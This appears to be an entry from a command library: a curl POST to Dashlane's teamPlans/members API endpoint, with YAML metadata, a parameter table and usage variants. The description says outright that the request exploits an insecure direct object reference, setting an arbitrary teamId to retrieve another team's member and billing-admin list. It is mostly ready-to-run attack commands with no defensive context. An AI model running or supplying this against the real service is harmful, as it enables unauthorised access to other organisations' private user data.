---
id: uuid-curl-team
data: >-
  curl -X POST 'https://ws1.dashlane.com/1/teamPlans/members' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'limit=0&login=example@email.com&orderBy=login&teamId=12345&uki=session_token_here'
tags:
  - api
  - http
  - post
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:59.247Z'
verified: false
validated: true
submitted: true
---
# curl-dashlane-team-members

## Command

```bash
curl -X POST 'https://ws1.dashlane.com/1/teamPlans/members' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'limit=0&login=example@email.com&orderBy=login&teamId=12345&uki=session_token_here'
```

## Description

This curl command sends a POST request to the Dashlane teamPlans/members API endpoint to retrieve team members, exploiting IDOR by specifying an arbitrary teamId. Use with valid login and uki for authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `-H 'Content-Type: ...'` | Sets body encoding | Yes |
| `-d '...'` | URL-encoded body with params: limit (0 for all), login (user email), orderBy (sort field), teamId (target team), uki (session token) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://ws1.dashlane.com/1/teamPlans/members' -H 'Content-Type: application/x-www-form-urlencoded' -d 'limit=0&login=user@example.com&orderBy=login&teamId=12345&uki=abc123token'
```

### Advanced Usage

```bash
curl -X POST 'https://ws1.dashlane.com/1/teamPlans/members' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0' -d 'limit=0&login=user@example.com&orderBy=login&teamId=12345&uki=abc123token' -o response.json
```

## Expected Output

JSON object with team data, including {"billingAdmins": [{"login": "admin@team.com"}]} if successful, or error if unauthorized.

## Related

- [[Related Procedure: Modify-Request-for-Arbitrary-Team-ID]]
